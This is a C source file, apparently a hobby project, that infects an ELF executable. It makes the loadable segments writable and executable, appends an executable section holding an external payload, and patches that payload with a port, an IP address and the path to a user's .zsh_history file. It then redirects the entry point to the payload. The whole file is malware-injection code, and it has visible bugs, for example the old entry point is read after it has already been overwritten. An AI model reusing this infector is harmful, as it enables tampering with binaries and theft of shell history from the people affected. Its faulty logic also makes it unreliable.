#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/syscall.h>
#include <elf.h>

#ifdef __APPLE__
#define CDECL_NORM(x) x
#else
#define CDECL_NORM(x) _ ## x
#endif /* __APPLE__ */

extern uint8_t CDECL_NORM(payload);
extern uint64_t CDECL_NORM(payload_size);

#define payload_p &CDECL_NORM(payload)
#define payload_size_p CDECL_NORM(payload_size)

uint16_t port = 0;
uint32_t addr_ip = 0;

int main(int argc, char *argv[], char *envp[]) {
	port = htons(3002);
	addr_ip = htonl(INADDR_ANY);
	printf("port: %#x %#x\n", port, addr_ip);

	int fd = open("testprog", O_RDWR);
	if (fd == -1) {
		perror("open");
		return 1;
	}

	struct stat st;
	if (fstat(fd, &st) == -1) {
		perror("fstat");
		return 1;
	}

	void *map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (map == MAP_FAILED) {
		perror("mmap");
		return 1;
	}

	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
	Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
	Elf64_Shdr *shdr = (Elf64_Shdr *)(map + ehdr->e_shoff);

	int last_phdr = -1;

	for (int i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_LOAD) {
			printf("found PT_LOAD\n");
			phdr[i].p_flags = PF_R | PF_W | PF_X;
			last_phdr = i;
		}
	}

	if (last_phdr == -1) {
		fprintf(stderr, "no PT_LOAD found\n");
		return 1;
	}

	Elf64_Phdr *last_phdr_p = &phdr[last_phdr];

	int last_section = -1;

	for (int j = 1; j < ehdr->e_shnum; j++)
	{
		// find the last section in the last segment
		if (shdr[j].sh_addr >= last_phdr_p->p_vaddr &&
			shdr[j].sh_addr < last_phdr_p->p_vaddr + last_phdr_p->p_memsz)
		{
			last_section = j;
		}
	}

	printf("last_phdr: %d\n", last_phdr);
	printf("last_section: %d\n", last_section);

	// create new section

	Elf64_Shdr new_shdr = {
		.sh_name = 0,
		.sh_type = SHT_PROGBITS,
		.sh_flags = SHF_ALLOC | SHF_EXECINSTR,
		.sh_addr = last_phdr_p->p_vaddr + last_phdr_p->p_memsz,
		.sh_offset = last_phdr_p->p_offset + last_phdr_p->p_filesz,
		.sh_size = payload_size_p,
		.sh_link = 0,
	};

	// update program header
	last_phdr_p->p_filesz += payload_size_p;
	last_phdr_p->p_memsz += payload_size_p;

	// update section headers after the new one
	// the section after `last_section` must be moved to leave space for the new section

	// since we are adding a new section, the file size must be increased and the file must be mapped again adding the section size + the payload size
	ftruncate(fd, st.st_size + sizeof(Elf64_Shdr) + payload_size_p);
	map = syscall(SYS_mremap, map, st.st_size, st.st_size + sizeof(Elf64_Shdr) + payload_size_p, 1, fd, 0);

	if (map == MAP_FAILED) {
		perror("mremap");
		return 1;
	}

	for (int j = ehdr->e_shnum - 1; j > last_section; j--)
	{
		shdr[j + 1] = shdr[j];
	}

	// insert the new section
	shdr[last_section + 1] = new_shdr;

	// the number of section headers has increased
	ehdr->e_shnum++;


	// move all the content at  map + new_shdr->sh_offset to leave space for the payload data

	memmove(map + new_shdr.sh_offset + payload_size_p, map + new_shdr.sh_offset, st.st_size - new_shdr.sh_offset);

	// copy the payload data to the new section

	memcpy(map + new_shdr.sh_offset, payload_p, payload_size_p);

	// update the payload patching the data

	// update the addr_ip
	memcpy(map + new_shdr.sh_offset + payload_size_p - 4, &addr_ip, sizeof(addr_ip));
	// update the port
	memcpy(map + new_shdr.sh_offset + payload_size_p - 4 - 2, &port, sizeof(port));
	// copy the file path
	memcpy(map + new_shdr.sh_offset + payload_size_p - 1024 - 6, "/home/maxence/.zsh_history", 27);

	// update the entry point

	ehdr->e_entry = new_shdr.sh_addr;

	// add the old entry point to the payload

	// get the old entry point
	uint64_t old_entry = ehdr->e_entry;
	// calculate the offset from the new entry point
	int32_t offset = old_entry - new_shdr.sh_addr;
	// update the payload with the offset
	memcpy(map + new_shdr.sh_offset + payload_size_p - 1186 - 6 - 4, &offset, sizeof(offset));

	// cleanup

	munmap(map, st.st_size);
	close(fd);

	return 0;
}
